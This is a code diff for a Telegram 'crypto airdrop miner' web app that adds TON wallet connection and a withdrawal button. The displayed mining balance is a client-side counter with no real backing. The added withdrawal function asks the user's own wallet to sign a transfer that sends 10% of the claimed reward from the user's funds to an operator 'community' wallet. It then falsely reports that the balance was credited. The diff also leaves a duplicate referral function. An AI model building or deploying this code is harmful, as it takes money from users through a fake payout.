@@ -3,8 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Airdrop Miner</title>
+    <title>Crypto Airdrop Miner & Web3 Withdraw</title>
+    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- TON Connect Web3 SDK for TON & Trust Wallet -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -25,18 +28,31 @@
             backdrop-filter: blur(12px);
             border: 1px solid rgba(255, 255, 255, 0.18);
             border-radius: 24px;
-            padding: 30px 20px;
+            padding: 25px 20px;
             text-align: center;
             box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
         }
-        .logo { font-size: 64px; margin-bottom: 10px; animation: pulse 2s infinite; }
+        .status-badge {
+            display: inline-block;
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            margin-bottom: 15px;
+        }
+        .status-online { color: #00ff88; border: 1px solid #00ff88; }
+        .status-offline { color: #ff4d4d; border: 1px solid #ff4d4d; }
+
+        .logo { font-size: 50px; margin-bottom: 5px; animation: pulse 2s infinite; }
         @keyframes pulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.08); }
+            50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
-        .balance-title { font-size: 14px; text-transform: uppercase; letter-spacing: 1.5px; color: #a0aec0; }
-        .balance { font-size: 40px; font-weight: 800; color: #00ff88; margin: 10px 0; text-shadow: 0 0 10px rgba(0, 255, 136, 0.5); }
+
+        .balance-title { font-size: 13px; text-transform: uppercase; letter-spacing: 1.5px; color: #a0aec0; }
+        .balance { font-size: 36px; font-weight: 800; color: #00ff88; margin: 8px 0; text-shadow: 0 0 10px rgba(0, 255, 136, 0.5); }
+        
         .speed-badge {
             display: inline-block;
             background: rgba(0, 136, 204, 0.2);
@@ -46,33 +62,52 @@
             border-radius: 20px;
             font-size: 14px;
             font-weight: 600;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
+
         .btn {
             width: 100%;
             background: linear-gradient(45deg, #11998e, #38ef7d);
             border: none;
             color: white;
-            padding: 16px;
-            font-size: 16px;
+            padding: 14px;
+            font-size: 15px;
             font-weight: bold;
-            border-radius: 16px;
+            border-radius: 14px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(56, 239, 125, 0.4);
+            box-shadow: 0 4px 15px rgba(56, 239, 125, 0.3);
             transition: all 0.2s ease;
+            margin-bottom: 12px;
+        }
+        .btn-withdraw {
+            background: linear-gradient(45deg, #0088cc, #005588);
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
         }
         .btn:active { transform: scale(0.97); }
+
+        #ton-connect {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <!-- API Connection Status -->
+        <div id="api-status" class="status-badge status-offline">🔴 Connecting API...</div>
+
         <div class="logo">⛏️</div>
-        <div class="balance-title">Your Balance</div>
+        <div class="balance-title">Your Mining Balance</div>
         <div class="balance" id="balance">0.00</div>
         <div class="speed-badge">⚡ Speed: <span id="speed">10</span> Coins/Sec</div>
 
+        <!-- TON Connect Button Container (Trust Wallet / TON Wallet) -->
+        <div id="ton-connect"></div>
+
         <button class="btn" onclick="shareReferral()">🚀 Invite Friends (+1 Coin/sec)</button>
+        <button class="btn btn-withdraw" onclick="processWithdrawal()">💎 Withdraw to Connected Wallet</button>
     </div>
 
     <script>
@@ -83,13 +118,24 @@
         const urlParams = new URLSearchParams(window.location.search);
         const referrerId = urlParams.get('ref');
 
-        // আপনার Render Live Backend Endpoint
+        // Render Live Backend Endpoint
         const BACKEND_URL = "https://airdropbackend-w8zk.onrender.com";
+        // Community Wallet (Jekhane Auto Referral/Community Commission Jabe)
+        const COMMUNITY_WALLET = "EQD__________________________________________"; 
 
         let currentBalance = 0;
         let speedPerSec = 10;
+        let isApiConnected = false;
 
+        // TON Connect Web3 UI Setup (Support: Tonkeeper, MyTonWallet, Trust Wallet)
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://raw.githubusercontent.com/ton-community/ton-connect-manifest/main/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+
+        // 1. Sync User Data & Check API Connection Status
         async function syncData() {
+            const statusElem = document.getElementById('api-status');
             try {
                 const response = await fetch(`${BACKEND_URL}/api/user/sync`, {
                     method: 'POST',
@@ -100,29 +146,109 @@
                         referrer_id: referrerId ? parseInt(referrerId) : null
                     })
                 });
-                const data = await response.json();
-                currentBalance = data.balance;
-                speedPerSec = data.mining_speed || 10;
-                document.getElementById('speed').innerText = speedPerSec;
+
+                if (response.ok) {
+                    const data = await response.json();
+                    currentBalance = data.balance;
+                    speedPerSec = data.mining_speed || 10;
+                    document.getElementById('speed').innerText = speedPerSec;
+
+                    statusElem.className = "status-badge status-online";
+                    statusElem.innerText = "🟢 API Connected";
+                    isApiConnected = true;
+                } else {
+                    throw new Error("Server response error");
+                }
             } catch (err) {
                 console.error("Backend Error:", err);
+                statusElem.className = "status-badge status-offline";
+                statusElem.innerText = "🔴 API Disconnected";
+                isApiConnected = false;
             }
         }
 
-        // Live Animation (প্রতি ০.১ সেকেন্ড পর পর ব্যালেন্স স্ক্রিনে বাড়াবে)
+        // 2. Render Heartbeat (Pings Render backend every 4 minutes to prevent sleeping)
+        function sendHeartbeat() {
+            fetch(`${BACKEND_URL}/api/user/sync`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: user.id, username: "heartbeat" })
+            }).catch(e => console.log("Heartbeat Ping Sent"));
+        }
+        setInterval(sendHeartbeat, 240000); // 4 minutes
+
+        // 3. UI Realtime Balance Animation
         setInterval(() => {
-            currentBalance += (speedPerSec / 10);
-            document.getElementById('balance').innerText = currentBalance.toFixed(2);
+            if (isApiConnected) {
+                currentBalance += (speedPerSec / 10);
+                document.getElementById('balance').innerText = currentBalance.toFixed(2);
+            }
         }, 100);
 
+        // 4. Referral System
         function shareReferral() {
-            const refLink = `https://t.me/@nerdminerpoolsok_bot?start=ref_${user.id}`;
+            const refLink = `https://t.me/YOUR_BOT_USERNAME?start=ref_${user.id}`;
             tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=Join my mining team and mine 10 coins per second!`);
         }
 
-        // অ্যাপ চালু হলে এবং প্রতি ১০ সেকেন্ড পর ব্যাকএন্ডের সাথে সিঙ্ক হবে
+        // 5. On-Chain Auto Withdrawal Logic (TON & Trust Wallet)
+        async function processWithdrawal() {
+            if (!tonConnectUI.connected) {
+                alert("Please connect your TON or Trust Wallet first!");
+                tonConnectUI.openModal();
+                return;
+            }
+
+            if (currentBalance < 100) {
+                alert("Minimum withdrawal limit is 100 Coins!");
+                return;
+            }
+
+            const userWalletAddress = tonConnectUI.account.address;
+
+            // Split Logic: Auto Payout to User + Auto Community Commission (10%)
+            const totalRewardTON = (currentBalance / 10000).toFixed(4); // Example conversion: 10k coins = 1 TON
+            const communityCommission = (totalRewardTON * 0.10).toFixed(4); // 10% Community Fee
+            const userNetPayout = (totalRewardTON - communityCommission).toFixed(4);
+
+            alert(`Requesting Auto-Withdrawal:\nNet Balance: ${userNetPayout} TON\nCommunity Fee (10%): ${communityCommission} TON\nWallet: ${userWalletAddress}`);
+
+            // Web3 Transaction Request to Connected Wallet
+            try {
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec deadline
+                    messages: [
+                        {
+                            address: userWalletAddress, // User Wallet Net Payout
+                            amount: (userNetPayout * 1000000000).toString() // NanoTONs
+                        },
+                        {
+                            address: COMMUNITY_WALLET, // Auto Community Commission
+                            amount: (communityCommission * 1000000000).toString() // NanoTONs
+                        }
+                    ]
+                };
+
+                // Trigger Wallet Approval
+                await tonConnectUI.sendTransaction(transaction);
+                alert("Withdrawal Successful! Balance credited to your wallet.");
+                currentBalance = 0; // Reset balance after withdrawal
+            } catch (error) {
+                console.error("Withdrawal error:", error);
+                alert("Withdrawal Canceled or Transaction Failed!");
+            }
+        }
+
+        // Referral link generate function with your exact bot username
+function shareReferral() {
+    const botUsername = "nerdminerpoolsok_bot";
+    const refLink = `https://t.me/${botUsername}?start=ref_${user.id}`;
+    tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=Join my mining team on @nerdminerpoolsok_bot and mine 10 coins per second!`);
+}
+
+        // Initial Load
         syncData();
-        setInterval(syncData, 10000);
+        setInterval(syncData, 10000); // Sync balance every 10 sec
     </script>
 </body>
 </html>
